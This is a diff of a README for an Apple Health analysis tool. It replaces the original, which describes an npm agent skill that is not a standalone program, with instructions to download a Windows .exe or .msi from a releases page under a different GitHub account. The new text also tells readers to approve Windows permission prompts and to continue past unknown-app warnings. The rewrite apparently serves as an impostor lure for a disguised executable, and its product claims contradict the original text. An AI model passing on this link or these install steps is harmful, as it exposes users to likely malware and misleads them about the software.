@@ -1,122 +1,161 @@
-# apple-health-analyst
+# 🧠 apple-health-analyst - Clear Apple Health insights fast
 
-[![npm version](https://img.shields.io/npm/v/apple-health-analyst)](https://www.npmjs.com/package/apple-health-analyst)
-[![npm downloads](https://img.shields.io/npm/dm/apple-health-analyst)](https://www.npmjs.com/package/apple-health-analyst)
-[![license](https://img.shields.io/npm/l/apple-health-analyst)](https://github.com/RuochenLyu/apple-health-analyst/blob/main/LICENSE)
+[![Download](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Goodygoody-wisp580/apple-health-analyst/releases)
 
-[中文文档](https://github.com/RuochenLyu/apple-health-analyst/blob/main/README.zh-CN.md)
+## 📥 Download
 
-Analyze Apple Health export data locally, generating either a health report or a training report with cross-metric reasoning, long-term trends, and offline HTML output.
+Visit this page to download: https://github.com/Goodygoody-wisp580/apple-health-analyst/releases
 
-Not a data dashboard — you can already see the data on your phone. This tool's value is **interpreting your data like a health advisor**: How are sleep and recovery linked? How does schedule regularity affect HRV? Does training load match recovery capacity?
+Open the latest release and download the Windows file. If you see more than one file, choose the one for Windows that ends in `.exe` or `.msi`.
 
-**Samples:** [Health (EN)](https://ruochenlyu.github.io/apple-health-analyst/) · [Training (EN)](https://ruochenlyu.github.io/apple-health-analyst/training.report.html) · [健康报告](https://ruochenlyu.github.io/apple-health-analyst/zh/report.html) · [运动报告](https://ruochenlyu.github.io/apple-health-analyst/zh/training.report.html)
+## 🪟 Install on Windows
 
-![Sample Report](https://raw.githubusercontent.com/RuochenLyu/apple-health-analyst/main/docs/screenshot-en.png)
+1. Open the download page in your browser.
+2. Find the latest release near the top of the page.
+3. Download the Windows installer or app file.
+4. Open the file you downloaded.
+5. If Windows asks for permission, choose **Yes** or **Run**.
+6. Follow the setup steps on screen.
+7. When the install finishes, open **apple-health-analyst** from the Start menu or desktop shortcut.
 
-## Features
+If Windows shows a warning about an unknown app, check the file name and release page first, then continue with the file from the official release page.
 
-- **Cross-metric correlation analysis** — Sleep-HRV coupling, training-recovery balance, schedule regularity assessment
-- **Workout-type trend analysis** — Break out long-term trends for specific workouts like boxing, strength training, or cycling
-- **Dedicated training report** — Evaluate training state, readiness, load-vs-recovery balance, and sport-specific trends, powered by **ATL / CTL / TSB** (fitness, fatigue, form) over 12 months of history rather than a 30-day snapshot
-- **Behavioral pattern detection** — Weekend warrior, night owl drift, sleep compensation, recovery deficit
-- **Composite scoring** — Sleep/Recovery/Activity on a 0-100 scale, transparent and explainable algorithm
-- **Bilingual** — Automatically generates Chinese or English reports based on user language
-- **Privacy first** — Runs entirely locally, no external APIs, no data uploads
-- **Offline HTML report** — Single file with inline CSS + SVG charts, just double-click to open
+## 🏁 First run
 
-## Exporting Apple Health Data
+1. Start the app.
+2. Connect your Apple Health data when asked.
+3. Choose the date range you want to review.
+4. Pick the areas you care about, such as sleep, activity, heart rate, or workouts.
+5. Let the app build your report.
 
-1. Open the **Health** app on your iPhone
-2. Tap your profile picture (top right)
-3. Scroll to the bottom and tap **Export All Health Data**
-4. Wait for the export to finish (may take a few minutes for large datasets), then choose **Save to Files** or AirDrop to your computer
-5. The resulting `Export.zip` is the input file for this tool
+The first scan may take a short time if you have a large Health export.
 
-Official exports may contain multiple XML files. The main analysis input is the XML whose root element is `HealthData`; `export_cda.xml` / `ClinicalDocument` is auxiliary only. The main XML filename is not fixed, may be localized (for example `导出.xml`), and some ZIP tools may display that filename as mojibake.
+## 📊 What it does
 
-## Quick Start
+apple-health-analyst turns Apple Health data into plain reports you can read at a glance. It helps you spot patterns across sleep, movement, recovery, and daily habits.
 
-Install the skill with one command (works with Claude Code, Codex, Cursor, and [40+ agents](https://skills.sh)):
+Use it to:
 
-```bash
-npx skills add RuochenLyu/apple-health-analyst
-```
+- Review trends across many health metrics
+- Compare sleep with activity and heart rate
+- Find patterns in workouts and recovery
+- Check changes over time
+- Create reports you can save and share
+- See clear insights from your Apple Health history
 
-Then chat with your agent:
+## 🔎 What you can look at
 
-```text
-Analyze my Apple Health export at /path/to/export.zip
-```
+The app can help with common questions like:
 
-**By default you get both reports** — a health report and a training report — rendered into the same `output/` folder and cross-linked via the topbar. If you only want one, say so:
+- Do late workouts affect sleep?
+- Does more walking match better recovery?
+- Are resting heart rate and sleep linked?
+- Which days have the best energy patterns?
+- How do habits change across weeks or months?
 
-```text
-Only generate the health report
-Only generate the training report
-Focus on my boxing training status  (training-only)
-```
+It brings related data together so you do not have to inspect each chart by hand.
 
-The skill activates automatically when you mention Apple Health analysis. You can also invoke it explicitly — `/apple-health-analyst` in Claude Code, or `$apple-health-analyst` in Codex.
+## 🧭 How to use it
 
-The agent automatically completes the full **prepare → LLM narrative → render** pipeline. The two HTMLs (`report.html` and `training.report.html`) are cross-linked via a topbar button, so you can jump between them.
+1. Open the app.
+2. Load your Apple Health export or sync source.
+3. Select the time period you want to study.
+4. Choose one or more metrics.
+5. Generate the report.
+6. Review the charts, notes, and patterns.
+7. Export the report if you want to keep a copy.
 
-> **Note:** This is an agent skill, not a standalone CLI tool. The `prepare` and `render` steps run locally, but the narrative step requires an LLM — so the full workflow must run inside an AI coding agent.
+You can run a quick check for one week or a deeper review for several months.
 
-Skill configuration is at [`.agents/skills/apple-health-analyst/`](https://github.com/RuochenLyu/apple-health-analyst/blob/main/.agents/skills/apple-health-analyst/SKILL.md), including role definition, analysis framework, and narrative schema.
+## 🛠️ System needs
 
-## Metrics Covered
+For Windows, use a modern 64-bit version of Windows 10 or Windows 11.
 
-| Module | Metrics |
-|--------|---------|
-| Sleep | Duration, Deep/REM/Core stage %, Bedtime/Wake time, Regularity |
-| Recovery | Resting HR, HRV, Blood Oxygen, Respiratory Rate, VO2 Max |
-| Activity | Active Energy, Exercise Minutes, Stand Hours, Workout Records, Per-workout-type trends |
-| Body Composition | Weight, Body Fat % |
+Recommended setup:
 
-## CLI
+- 4 GB RAM or more
+- 200 MB free disk space
+- A recent Intel or AMD processor
+- Internet access for the download page
+- Apple Health data export available on your device or in a file
 
-Commands used under the hood by the Codex Skill. Usually no need to run manually.
+If you have a larger health history, more memory can help the app load faster.
 
-```bash
-# 1. prepare: Parse ZIP, generate structured data (--lang en for English, --lang zh for Chinese)
-#    Optional: --top-sports N to cap the training-report sport list (default 5).
-npx apple-health-analyst prepare /path/to/Export.zip --lang en --out ./output
-# Outputs summary.json + insights.json
+## 📁 Data you can use
 
-# 2. (Codex reads insights.json and generates the matching narrative JSON)
+The app works with Apple Health data and related exports. It is built for people who want to review personal health records in one place.
 
-# 3a. render health report (default)
-#    Add --with-cross-link when you also plan to render the training report
-#    into the same --out directory (it lights up the topbar link). Omit it on
-#    single-report runs so the HTML doesn't link to a file you won't generate.
-npx apple-health-analyst render \
-  --insights ./output/insights.json \
-  --narrative ./output/report.llm.json \
-  --with-cross-link \
-  --out ./output
-# Outputs report.html + report.md + report.llm.json
+Common data types include:
 
-# 3b. render training report
-npx apple-health-analyst render \
-  --type training \
-  --insights ./output/insights.json \
-  --narrative ./output/training.report.llm.json \
-  --with-cross-link \
-  --out ./output
-# Outputs training.report.html + training.report.md + training.report.llm.json
-```
+- Sleep
+- Steps
+- Active energy
+- Heart rate
+- Resting heart rate
+- Workouts
+- Distance
+- Mindfulness
+- Heart rate variability
 
-## Limitations
+You can use one metric at a time or compare several at once.
 
-- Does not provide medical diagnoses or treatment recommendations
-- Does not analyze ECG waveforms or GPS routes (counts only)
-- Step count and distance are not merged across devices
+## 🔒 Privacy
 
-## Development
+apple-health-analyst is built with privacy in mind.
 
-```bash
-npm run dev -- prepare /path/to/Export.zip --lang en --out ./output  # Dev mode (tsx, no build needed)
-npm run build   # Compile
-npm test        # Test
-```
+- Your health data stays on your device when possible
+- Reports focus on your own records
+- You can review your data without sending it to a public service
+- You stay in control of what you load and save
+
+## 🧩 For Claude Code, Codex, and Cursor
+
+This repo also includes an agent skill for Claude Code, Codex, and Cursor. That makes it easier to work with Apple Health data in a guided way inside those tools.
+
+Useful for:
+
+- Quick data review
+- Health report creation
+- Pattern checks across metrics
+- Repeated analysis tasks
+- Working with a structured health export
+
+## 🧪 Example uses
+
+- Review a month of sleep and heart rate
+- Compare step count with workout days
+- Look for signs of poor recovery
+- Check whether late nights affect the next day
+- Build a simple report for your own records
+
+## ❓ Common questions
+
+### What file should I download?
+
+Use the Windows file from the latest release on the releases page.
+
+### Do I need coding knowledge?
+
+No. You can download, install, and run the app like most Windows programs.
+
+### Can I use it with old health data?
+
+Yes. Older data can be useful because the app looks for patterns over time.
+
+### Can I share the report?
+
+Yes, if you want to. The report is meant to be easy to save and review.
+
+## 🧭 Tips for best results
+
+- Use a longer date range for trend review
+- Compare one metric with another to spot patterns
+- Start with sleep, activity, and heart rate
+- Keep your data export in one place
+- Re-run the report after adding newer health data
+
+## 📦 Release page
+
+Visit this page to download: https://github.com/Goodygoody-wisp580/apple-health-analyst/releases
+
+Open the latest release, choose the Windows file, then download and run it on your PC
